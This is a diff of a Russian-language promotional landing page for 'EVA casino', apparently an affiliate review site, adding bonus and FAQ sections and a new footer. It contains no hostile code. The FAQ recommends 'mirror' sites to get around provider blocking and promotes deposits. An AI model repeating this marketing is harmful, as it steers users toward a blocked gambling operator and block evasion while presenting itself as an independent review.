+                  <span class="text-sm"><strong>Кэшбэк</strong> — возврат до 10% проигранных средств каждую неделю без вейджера.</span>
+                </li>
+                <li class="flex items-start gap-3">
+                  <i data-lucide="check-circle-2" class="w-5 h-5 text-emerald-400 mt-0.5 shrink-0"></i>
+                  <span class="text-sm"><strong>Турниры</strong> — соревнования среди игроков с розыгрышем крупных денежных призов и гаджетов.</span>
+                </li>
+              </ul>
+              <p class="text-sm text-slate-400 mt-4">
+                Перед активацией бонуса внимательно читайте условия отыгрыша. Это поможет избежать недопонимания при выводе выигрыша.
+              </p>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section id="faq" class="h8q_faq px-4 py-16 md:py-24">
+        <div class="max-w-3xl mx-auto">
+          <h2 class="text-2xl md:text-4xl font-bold text-white mb-8 text-center">Вопросы и ответы про <span class="text-amber-500">eva казино</span></h2>
+          
+          <div class="space-y-2">
+            <div class="h8q_item border-b border-slate-700">
+              <button class="h8q_question" aria-expanded="false">
+                <span>Чем отличается eva casino официальный сайт от зеркала?</span>
+                <i data-lucide="chevron-down" class="w-5 h-5 text-slate-400 transition-transform duration-300"></i>
+              </button>
+              <div class="h8q_answer hidden">
+                <p>Функционально ничем. Зеркало — это резервная копия основного портала с идентичным дизайном, играми и балансом. Оно нужно только для обхода блокировок провайдера.</p>
+              </div>
+            </div>
+            
+            <div class="h8q_item border-b border-slate-700">
+              <button class="h8q_question" aria-expanded="false">
+                <span>Можно ли на ева казино играть бесплатно?</span>
+                <i data-lucide="chevron-down" class="w-5 h-5 text-slate-400 transition-transform duration-300"></i>
+              </button>
+              <div class="h8q_answer hidden">
+                <p>Да. Большинство слотов поддерживают демо-режим. Вы получаете виртуальные кредиты и можете изучить механику игры без регистрации и риска для бюджета.</p>
+              </div>
+            </div>
+            
+            <div class="h8q_item border-b border-slate-700">
+              <button class="h8q_question" aria-expanded="false">
+                <span>Как найти рабочее зеркало Ева казино?</span>
+                <i data-lucide="chevron-down" class="w-5 h-5 text-slate-400 transition-transform duration-300"></i>
+              </button>
+              <div class="h8q_answer hidden">
+                <p>Актуальные адреса публикуются в официальных телеграм-каналах и рассылках. Не переходите по сомнительным ссылкам из незнакомых источников, чтобы не столкнуться с фишингом.</p>
+              </div>
+            </div>
+            
+            <div class="h8q_item border-b border-slate-700">
+              <button class="h8q_question" aria-expanded="false">
+                <span>Какие платежные системы поддерживаются?</span>
+                <i data-lucide="chevron-down" class="w-5 h-5 text-slate-400 transition-transform duration-300"></i>
+              </button>
+              <div class="h8q_answer hidden">
+                <p>Банковские карты Visa/Mastercard, электронные кошельки, мобильные операторы и криптовалюта. Минимальная сумма депозита начинается от 500 рублей или эквивалента в другой валюте.</p>
+              </div>
+            </div>
+            
+            <div class="h8q_item border-b border-slate-700">
+              <button class="h8q_question" aria-expanded="false">
+                <span>Есть ли мобильное приложение?</span>
+                <i data-lucide="chevron-down" class="w-5 h-5 text-slate-400 transition-transform duration-300"></i>
+              </button>
+              <div class="h8q_answer hidden">
+                <p>Да, доступны приложения для Android и iOS. Однако мобильная версия сайта работает не хуже: она легкая, быстрая и не требует установки, что экономит место на телефоне.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+    </article>
   </main>
 
-  <footer class="bg-slate-900 text-white py-12">
-    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-      <div class="grid grid-cols-1 md:grid-cols-4 gap-8 mb-8">
-        <div>
-          <h3 class="text-xl font-bold mb-4 text-amber-500">EVA Casino</h3>
-          <p class="text-slate-400">
-            Официальный сайт и зеркала казино EVA для игроков из России и СНГ. Играйте в лучшие игровые автоматы с бонусами и акциями.
-          </p>
+  <footer class="i9p_footer px-4 py-12">
+    <div class="max-w-6xl mx-auto grid md:grid-cols-3 gap-8 text-sm">
+      <div>
+        <div class="flex items-center gap-2 mb-4">
+          <i data-lucide="diamond" class="w-5 h-5 text-amber-500"></i>
+          <span class="font-bold text-white">EVA<span class="text-amber-500">REVIEW</span></span>
         </div>
-        
-        <div>
-          <h4 class="font-bold mb-4 text-amber-400">Навигация</h4>
-          <ul class="space-y-2">
-            <li><a href="#home" class="text-slate-400 hover:text-amber-500 transition">Главная</a></li>
-            <li><a href="#games" class="text-slate-400 hover:text-amber-500 transition">Игровые автоматы</a></li>
-            <li><a href="#bonuses" class="text-slate-400 hover:text-amber-500 transition">Бонусы</a></li>
-            <li><a href="#mirrors" class="text-slate-400 hover:text-amber-500 transition">Зеркала</a></li>
-          </ul>
-        </div>
-        
-        <div>
-          <h4 class="font-bold mb-4 text-amber-400">Еще</h4>
-          <ul class="space-y-2">
-            <li><a href="#faq" class="text-slate-400 hover:text-amber-500 transition">Частые вопросы</a></li>
-            <li><a href="#" class="text-slate-400 hover:text-amber-500 transition">О нас</a></li>
-            <li><a href="#" class="text-slate-400 hover:text-amber-500 transition">Правила игры</a></li>
-            <li><a href="#" class="text-slate-400 hover:text-amber-500 transition">Контакты</a></li>
-          </ul>
-        </div>
-        
-        <div>
-          <h4 class="font-bold mb-4 text-amber-400">Платежные Системы</h4>
-          <div class="flex flex-wrap gap-2">
-            <span class="px-2 py-1 bg-slate-800 rounded text-sm">Visa</span>
-            <span class="px-2 py-1 bg-slate-800 rounded text-sm">Mastercard</span>
-            <span class="px-2 py-1 bg-slate-800 rounded text-sm">QIWI</span>
-            <span class="px-2 py-1 bg-slate-800 rounded text-sm">Yandex</span>
-            <span class="px-2 py-1 bg-slate-800 rounded text-sm">Crypto</span>
-          </div>
-        </div>
+        <p class="text-slate-500">Независимый информационный портал о мире азартных развлечений. Мы не организуем азартные игры на деньги.</p>
       </div>
-      
-      <div class="border-t border-slate-800 pt-6">
-        <p class="text-slate-500 text-sm">
-          © 2024 EVA Casino review. Информация на сайте не является публичной офертой. Использование сайта означает согласие с условиями. Играйте ответственно. 18+
-        </p>
+      <div>
+        <h4 class="text-white font-semibold mb-3">Разделы</h4>
+        <ul class="space-y-2 text-slate-400">
+          <li><a href="#obzor" class="hover:text-amber-400 transition-colors">Обзор</a></li>
+          <li><a href="#zerkalo" class="hover:text-amber-400 transition-colors">Зеркало</a></li>
+          <li><a href="#start" class="hover:text-amber-400 transition-colors">Регистрация</a></li>
+          <li><a href="#bonusy" class="hover:text-amber-400 transition-colors">Бонусы</a></li>
+        </ul>
       </div>
+      <div>
+        <h4 class="text-white font-semibold mb-3">Ответственность</h4>
+        <p class="text-slate-500">Азартные игры могут вызывать зависимость. Играйте ответственно. Сайт предназначен для лиц старше 18 лет.</p>
+      </div>
+    </div>
+    <div class="max-w-6xl mx-auto mt-8 pt-8 border-t border-slate-800 text-center text-xs text-slate-600">
+      © 2024 EVA Review Hub. Все права защищены.
     </div>
   </footer>
 
-  <script>
-    lucide.createIcons();
-
-    const mobileMenuBtn = document.getElementById('mobileMenuBtn');
-    const mobileMenu = document.getElementById('mobileMenu');
-    
-    mobileMenuBtn.addEventListener('click', () => {
-      mobileMenu.classList.toggle('hidden');
-    });
-    
-    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-      anchor.addEventListener('click', function (e) {
-        e.preventDefault();
-        const targetId = this.getAttribute('href');
-        const targetElement = document.querySelector(targetId);
-        
-        if (targetElement) {
-          window.scrollTo({
-            top: targetElement.offsetTop - 80,
-            behavior: 'smooth'
-          });
-
-          if (!mobileMenu.classList.contains('hidden')) {
-            mobileMenu.classList.add('hidden');
-          }
-        }
-      });
-    });
-
-    document.querySelectorAll('#mobileMenu a').forEach(link => {
-      link.addEventListener('click', () => {
-        mobileMenu.classList.add('hidden');
-      });
-    });
-
-    window.addEventListener('scroll', () => {
-      const header = document.querySelector('header');
-      if (window.scrollY > 20) {
-        header.classList.add('shadow-md');
-      } else {
-        header.classList.remove('shadow-md');
-      }
-    });
-  </script>
+  <script src="script.js"></script>
 </body>
 </html>
